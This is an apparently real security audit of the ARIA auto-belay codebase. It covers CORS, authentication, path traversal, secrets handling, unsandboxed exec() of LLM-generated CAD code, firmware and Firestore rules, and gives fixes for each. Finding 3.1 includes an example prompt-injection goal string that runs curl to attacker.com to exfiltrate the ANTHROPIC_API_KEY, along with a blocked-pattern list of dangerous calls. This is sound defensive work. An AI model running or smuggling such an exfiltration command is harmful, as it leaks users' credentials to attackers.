# ARIA System Security Audit

**Date:** 2026-03-26
**Status:** Complete
**Scope:** API server, secrets management, firmware comms, companion app

---

## 1. API Server Security

### Files reviewed
- `/home/user/aria-auto-belay/aria_server.py` (primary FastAPI server)
- `aria_os/api_server.py` does not exist on disk (referenced in CLAUDE.md but never created)

---

### FINDING 1.1 -- Wildcard CORS Policy
**Severity: HIGH**
**File:** `aria_server.py:30-35`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Risk:** Any website on the internet can make cross-origin requests to this API. An attacker could host a malicious page that, when visited by someone on the same network as an ARIA server, triggers CAD generation, reads part data, or streams pipeline events. This is a classic CSRF-via-CORS vector.

**Fix:**
```python
ALLOWED_ORIGINS = os.environ.get(
    "ARIA_CORS_ORIGINS", "http://localhost:3000"
).split(",")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_methods=["GET", "POST"],
    allow_headers=["Content-Type"],
)
```

---

### FINDING 1.2 -- No Authentication or Authorization
**Severity: HIGH**
**File:** `aria_server.py` (all routes)

No endpoint requires any form of authentication. Anyone with network access to port 8000 can:
- Trigger unbounded CAD generation pipelines (`POST /api/generate`)
- Read all part data and session history
- Download arbitrary STL files
- Stream all internal pipeline events via SSE

**Fix:** Add at minimum a bearer token check via a FastAPI dependency:
```python
from fastapi import Depends, Security
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

security = HTTPBearer()
ARIA_API_TOKEN = os.environ.get("ARIA_API_TOKEN", "")

async def verify_token(creds: HTTPAuthorizationCredentials = Security(security)):
    if not ARIA_API_TOKEN or creds.credentials != ARIA_API_TOKEN:
        raise HTTPException(status_code=401, detail="Invalid token")
```
Then add `Depends(verify_token)` to each route.

---

### FINDING 1.3 -- No Rate Limiting
**Severity: MEDIUM**
**File:** `aria_server.py`

`POST /api/generate` spawns a background thread that runs the full CAD pipeline (LLM calls, CEM physics, CadQuery execution). There is no rate limiting. An attacker can:
- Exhaust LLM API quotas and incur unbounded billing
- Spawn hundreds of concurrent background threads causing denial of service
- Overwhelm the CPU with CadQuery `exec()` calls

**Fix:** Add `slowapi` or a simple in-memory rate limiter. Also cap concurrent pipeline runs:
```python
import threading
_PIPELINE_SEMAPHORE = threading.Semaphore(3)  # max 3 concurrent

def _run_pipeline(goal, max_attempts):
    if not _PIPELINE_SEMAPHORE.acquire(blocking=False):
        event_bus.emit("error", "Too many concurrent pipelines", {})
        return
    try:
        run(goal, repo_root=REPO_ROOT, max_attempts=max_attempts)
    finally:
        _PIPELINE_SEMAPHORE.release()
```

---

### FINDING 1.4 -- Unbounded `max_attempts` Parameter
**Severity: MEDIUM**
**File:** `aria_server.py:43-44`

```python
class GenerateRequest(BaseModel):
    goal: str
    max_attempts: int = 3
```

No upper bound on `max_attempts`. A client can send `max_attempts: 1000000`, causing the pipeline to retry indefinitely, each attempt consuming LLM tokens and CPU.

**Fix:**
```python
from pydantic import Field

class GenerateRequest(BaseModel):
    goal: str = Field(..., min_length=1, max_length=2000)
    max_attempts: int = Field(default=3, ge=1, le=10)
```

---

### FINDING 1.5 -- Path Traversal in STL File Serving
**Severity: HIGH**
**File:** `aria_server.py:104-114`

```python
@app.get("/api/parts/{part_id}/stl")
async def get_stl(part_id: str):
    stl_dir = REPO_ROOT / "outputs" / "cad" / "stl"
    matches = list(stl_dir.glob(f"*{part_id}*.stl")) if stl_dir.exists() else []
```

The `part_id` parameter is used directly in a glob pattern with no sanitization. While FastAPI URL-decodes the path parameter, a crafted `part_id` containing glob metacharacters (`*`, `?`, `[`, `]`) or path separators could match unintended files. The `*{part_id}*` pattern with a `part_id` like `../../etc/passwd` would not directly traverse (glob is relative to `stl_dir`), but `part_id` values containing `]` or `[` can cause unexpected glob behavior or exceptions.

More critically, `part_id` is user-controlled and reflected in a filesystem glob call with no length limit.

**Fix:**
```python
import re

@app.get("/api/parts/{part_id}/stl")
async def get_stl(part_id: str):
    if not re.match(r'^[a-zA-Z0-9_\-]+$', part_id):
        raise HTTPException(status_code=400, detail="Invalid part_id")
    stl_dir = REPO_ROOT / "outputs" / "cad" / "stl"
    matches = list(stl_dir.glob(f"*{part_id}*.stl")) if stl_dir.exists() else []
    if not matches:
        raise HTTPException(status_code=404, detail=f"No STL found for {part_id}")
    stl_file = max(matches, key=lambda p: p.stat().st_mtime)
    # Verify resolved path is within stl_dir
    if not stl_file.resolve().is_relative_to(stl_dir.resolve()):
        raise HTTPException(status_code=403, detail="Access denied")
    return FileResponse(str(stl_file), media_type="model/stl", filename=stl_file.name)
```

---

### FINDING 1.6 -- No Request Size Limit
**Severity: LOW**
**File:** `aria_server.py`

No middleware limits the size of incoming POST bodies. A malicious client could send a multi-gigabyte `goal` string.

**Fix:** The Pydantic `max_length` fix in 1.4 handles the JSON field. Also consider adding uvicorn's `--limit-request-body` flag or a middleware:
```python
# In uvicorn startup:
uvicorn.run("aria_server:app", host="0.0.0.0", port=8000,
            limit_max_request_size=1_048_576)  # 1MB
```

---

### FINDING 1.7 -- Server Binds to 0.0.0.0
**Severity: MEDIUM**
**File:** `aria_server.py:164`

```python
uvicorn.run("aria_server:app", host="0.0.0.0", port=8000, reload=True)
```

Combined with no auth and wildcard CORS, this exposes the entire pipeline to the local network and potentially the internet.

**Fix:** Default to `127.0.0.1` for development:
```python
uvicorn.run("aria_server:app",
            host=os.environ.get("ARIA_HOST", "127.0.0.1"),
            port=int(os.environ.get("ARIA_PORT", "8000")),
            reload=True)
```

---

### FINDING 1.8 -- Internal Exception Details Exposed
**Severity: LOW**
**File:** `aria_server.py:101, 155`

```python
raise HTTPException(status_code=500, detail=str(e))
```

Internal Python exception messages (which may include file paths, library versions, or stack traces) are returned directly to the client.

**Fix:** Log the full exception server-side; return a generic message to the client:
```python
import logging
logger = logging.getLogger("aria_server")

except Exception as e:
    logger.exception("Failed to read learning log")
    raise HTTPException(status_code=500, detail="Internal server error")
```

---

## 2. Secrets Management

### Files reviewed
- `/home/user/aria-auto-belay/aria_os/llm_client.py`
- `/home/user/aria-auto-belay/.env.example`
- `/home/user/aria-auto-belay/aria-climb/.env.example`
- `/home/user/aria-auto-belay/.gitignore`
- `/home/user/aria-auto-belay/aria_dashboard.py`

---

### FINDING 2.1 -- `serviceAccountKey.json` Not in `.gitignore`
**Severity: CRITICAL**
**Files:** `aria_dashboard.py:615-618`, `aria_offline_mode.py:151-152`, `.gitignore`

The codebase references `serviceAccountKey.json` (a Firebase Admin SDK private key file) in two places:
```python
cred = credentials.Certificate("serviceAccountKey.json")
```

This file grants **full admin access** to the Firebase project (read/write all Firestore, Storage, Auth). It is **not listed in `.gitignore`**. If a developer creates this file and runs `git add .`, it will be committed and pushed.

**Fix:** Add to `.gitignore` immediately:
```
# Firebase admin credentials — NEVER commit
serviceAccountKey.json
*serviceAccount*.json
```

---

### FINDING 2.2 -- Custom `.env` Parser Instead of Standard Library
**Severity: LOW**
**File:** `aria_os/llm_client.py:50-71, 74-94`

The codebase implements its own `.env` file parser instead of using `python-dotenv`. The custom parser:
- Silently swallows all parsing exceptions (`except Exception: pass`)
- Does not handle multi-line values, escaped characters, or export prefixes
- Reads the file on every call (no caching)

While not a direct vulnerability, custom parsers are more likely to have edge-case bugs. The silent exception swallowing could mask configuration errors.

**Fix:** Use `python-dotenv`:
```python
from dotenv import load_dotenv
load_dotenv()  # once at module load
# Then just use os.environ.get() everywhere
```

---

### FINDING 2.3 -- No Key Rotation or Expiry Mechanism
**Severity: LOW**
**File:** `aria_os/llm_client.py`

API keys are read from `.env` and used indefinitely. There is no mechanism for:
- Key rotation reminders
- Key expiry detection
- Separate keys for development vs production

This is acceptable for a single-developer project but should be addressed before any multi-user or production deployment.

---

### FINDING 2.4 -- API Keys Potentially Logged in Error Messages
**Severity: MEDIUM**
**File:** `aria_os/llm_client.py:204, 251, 315`

```python
print(f"[LLM] anthropic failed: {exc}")
print(f"[LLM] gemini (google-genai) failed: {exc}")
```

Some LLM client libraries include request details (potentially including auth headers) in exception messages. These are printed to stdout, which may be captured in logs, SSE streams, or session files.

**Fix:** Sanitize exception output:
```python
print(f"[LLM] anthropic failed: {type(exc).__name__}: {str(exc)[:200]}")
```
And ensure the event_bus SSE stream does not forward raw error strings.

---

## 3. Code Execution / Injection

### FINDING 3.1 -- Unsandboxed `exec()` of LLM-Generated Code
**Severity: CRITICAL**
**Files:** `aria_os/validator.py:129`, `aria_os/cadquery_generator.py:810`

```python
# validator.py
exec(code, namespace)

# cadquery_generator.py
exec(compile(cq_code, f"<{part_id}_cq>", "exec"), ns)
```

LLM-generated CadQuery code is executed via `exec()` with no sandboxing. The LLM output is arbitrary Python code that has full access to:
- The filesystem (read/write/delete any file the process can access)
- Network (make outbound HTTP requests, exfiltrate data)
- OS commands (via `os.system`, `subprocess`, etc.)
- Environment variables (including API keys)

If the LLM is manipulated via prompt injection (e.g., a malicious goal string like `"bracket; import os; os.system('curl attacker.com/exfil?key=' + os.environ['ANTHROPIC_API_KEY'])"`) or if the LLM hallucinates dangerous code, it will be executed.

**Risk:** Remote code execution via prompt injection through the API.

**Fix (defense in depth):**
1. **Restricted builtins:** Strip dangerous modules from the exec namespace:
```python
SAFE_BUILTINS = {k: v for k, v in __builtins__.__dict__.items()
                 if k not in ('__import__', 'exec', 'eval', 'compile',
                              'open', 'input', 'breakpoint')}

def _safe_import(name, *args, **kwargs):
    ALLOWED = {'cadquery', 'math', 'numpy'}
    if name not in ALLOWED:
        raise ImportError(f"Import of {name!r} blocked by sandbox")
    return __import__(name, *args, **kwargs)

ns = {"__builtins__": {**SAFE_BUILTINS, "__import__": _safe_import}}
exec(compile(cq_code, f"<{part_id}_cq>", "exec"), ns)
```

2. **Static pre-scan:** Before exec, scan the code for dangerous patterns:
```python
BLOCKED_PATTERNS = ['import os', 'import subprocess', 'import sys',
                    'os.system', 'os.popen', 'subprocess.',
                    'open(', '__import__', 'eval(', 'exec(']
for pat in BLOCKED_PATTERNS:
    if pat in cq_code:
        raise ValueError(f"Blocked pattern in generated code: {pat}")
```

3. **Process isolation:** Run CadQuery scripts in a subprocess with restricted permissions (longer-term).

---

### FINDING 3.2 -- Goal String Injection into Pipeline Events
**Severity: LOW**
**File:** `aria_server.py:66`

```python
event_bus.emit("step", f"Received goal: {req.goal[:80]}", {"goal": req.goal})
```

The full goal string is placed into event data and streamed via SSE. If the SSE consumer renders this in HTML without escaping, this is an XSS vector. The goal string is also truncated to 80 chars in the message but the full value is in the `data` dict.

**Fix:** This is primarily a client-side concern, but the server should sanitize or at minimum document that consumers must escape SSE data.

---

## 4. Firmware Communication

### Files reviewed
- `/home/user/aria-auto-belay/firmware/stm32/aria_main.cpp` (null-byte stub)
- `/home/user/aria-auto-belay/firmware/stm32/safety.cpp` (null-byte stub)
- `/home/user/aria-auto-belay/firmware/esp32/aria_esp32_firmware.ino` (null-byte stub)

All firmware files are null-byte stubs (hardware not yet arrived). The following are **design-phase recommendations** based on the architecture documented in CLAUDE.md.

---

### FINDING 4.1 -- UART Command Injection Risk (Design Phase)
**Severity: HIGH (future)**

The architecture specifies ESP32 sends commands to STM32 over UART. Without a defined protocol, common risks include:
- No message framing: attacker-controlled ESP32 data could be misinterpreted
- No authentication: the STM32 should not blindly trust ESP32 commands for safety-critical operations
- No message integrity: no CRC or HMAC on UART frames

**Recommendation for firmware implementation:**
```
Frame format: [0xAA][LEN][CMD][PAYLOAD...][CRC16][0x55]
- Fixed start/end delimiters
- Length field with max payload size (e.g., 64 bytes)
- CRC-16/CCITT for integrity
- Command whitelist on STM32 side
- STM32 must NEVER execute brake-release or tension-change
  commands that come solely from ESP32 without independent
  sensor confirmation
```

---

### FINDING 4.2 -- BLE Security Not Yet Defined (Design Phase)
**Severity: HIGH (future)**

The ESP32 exposes BLE for the companion app. The `bleManager.ts` and `bleCharacteristics.ts` are stubs. When implemented:

**Required:**
- BLE pairing must use Secure Connections (LE Secure Connections, LESC) with numeric comparison or passkey
- Do NOT use "Just Works" pairing (no MITM protection)
- Encrypt all characteristics (require bonding)
- Safety-critical characteristics (brake, tension) must be read-only from the app side
- Implement BLE authentication: device should verify the app identity before accepting commands

---

### FINDING 4.3 -- Debug Port Exposure (Design Phase)
**Severity: MEDIUM (future)**

**Recommendation:** Before shipping any hardware:
- Disable JTAG/SWD debug ports in production firmware (STM32 RDP Level 1 minimum)
- Disable ESP32 UART0 debug console or require authentication
- Set STM32 flash read protection to prevent firmware extraction

---

## 5. Companion App (aria-climb)

### Files reviewed
- `/home/user/aria-auto-belay/aria-climb/src/services/firebase/auth.ts` (null-byte stub)
- `/home/user/aria-auto-belay/aria-climb/src/services/firebase/*.ts` (mostly null-byte stubs)
- `/home/user/aria-auto-belay/aria-climb/src/services/ble/*.ts` (stubs)
- `/home/user/aria-auto-belay/aria-climb/firestore.rules` (null-byte stub)
- `/home/user/aria-auto-belay/aria-climb/.env.example`

---

### FINDING 5.1 -- Firestore Security Rules Are Empty
**Severity: CRITICAL (when deployed)**
**File:** `aria-climb/firestore.rules`

The Firestore rules file is a null-byte stub. By default, Firebase deploys with either locked-down rules (deny all) or test-mode rules (allow all reads/writes for 30 days). If test-mode rules are deployed:
- Any authenticated (or unauthenticated) user can read/write all data
- Climbing session data, device configs, incident reports -- all exposed

**Recommendation:** Before any Firebase deployment, implement rules such as:
```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Users can only read/write their own profile
    match /users/{uid} {
      allow read, write: if request.auth != null && request.auth.uid == uid;
    }
    // Gym data: read by members, write by gym admins
    match /gyms/{gymId} {
      allow read: if request.auth != null;
      allow write: if request.auth != null
        && get(/databases/$(database)/documents/gyms/$(gymId)/admins/$(request.auth.uid)).data.role == 'admin';
    }
    // Sessions: owner-only access
    match /gyms/{gymId}/sessions/{sessionId} {
      allow read, write: if request.auth != null
        && resource.data.uid == request.auth.uid;
    }
    // Deny everything else
    match /{document=**} {
      allow read, write: if false;
    }
  }
}
```

---

### FINDING 5.2 -- Firebase Config in Environment Variables (Acceptable)
**Severity: INFO**
**File:** `aria-climb/.env.example`

Firebase client-side config keys (API key, project ID, etc.) are in env vars. These are intentionally public (they identify the project, not grant access). Security is enforced by Firestore rules + Firebase Auth -- which makes Finding 5.1 even more critical.

---

### FINDING 5.3 -- No App-Level Auth Implementation Yet
**Severity: MEDIUM (future)**
**File:** `aria-climb/src/services/firebase/auth.ts` (null-byte stub)

Authentication is not yet implemented. When implementing:
- Use Firebase Auth with email/password or OAuth providers
- Enforce email verification before granting device access
- Implement proper session management (token refresh, sign-out)
- Do not store auth tokens in AsyncStorage without encryption

---

## 6. Summary of Findings

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1.1 | Wildcard CORS policy | HIGH | Fix now |
| 1.2 | No authentication on API | HIGH | Fix now |
| 1.3 | No rate limiting | MEDIUM | Fix now |
| 1.4 | Unbounded max_attempts | MEDIUM | Fix now |
| 1.5 | Path traversal in STL endpoint | HIGH | Fix now |
| 1.6 | No request size limit | LOW | Fix now |
| 1.7 | Server binds 0.0.0.0 | MEDIUM | Fix now |
| 1.8 | Exception details exposed | LOW | Fix now |
| 2.1 | serviceAccountKey.json not in .gitignore | CRITICAL | Fix immediately |
| 2.2 | Custom .env parser | LOW | Improve later |
| 2.3 | No key rotation mechanism | LOW | Improve later |
| 2.4 | API keys in error logs | MEDIUM | Fix now |
| 3.1 | Unsandboxed exec() of LLM code | CRITICAL | Fix now |
| 3.2 | Goal string injection in SSE | LOW | Document |
| 4.1 | UART command injection (design) | HIGH | Plan now |
| 4.2 | BLE security undefined (design) | HIGH | Plan now |
| 4.3 | Debug port exposure (design) | MEDIUM | Plan now |
| 5.1 | Empty Firestore security rules | CRITICAL | Fix before deploy |
| 5.2 | Firebase config in env vars | INFO | Acceptable |
| 5.3 | No auth implementation yet | MEDIUM | Implement |

### Priority Actions (do these first)
1. Add `serviceAccountKey.json` to `.gitignore` (Finding 2.1)
2. Add exec() sandboxing for LLM-generated code (Finding 3.1)
3. Restrict CORS origins (Finding 1.1)
4. Add API authentication (Finding 1.2)
5. Sanitize part_id in STL endpoint (Finding 1.5)
6. Bind server to localhost by default (Finding 1.7)
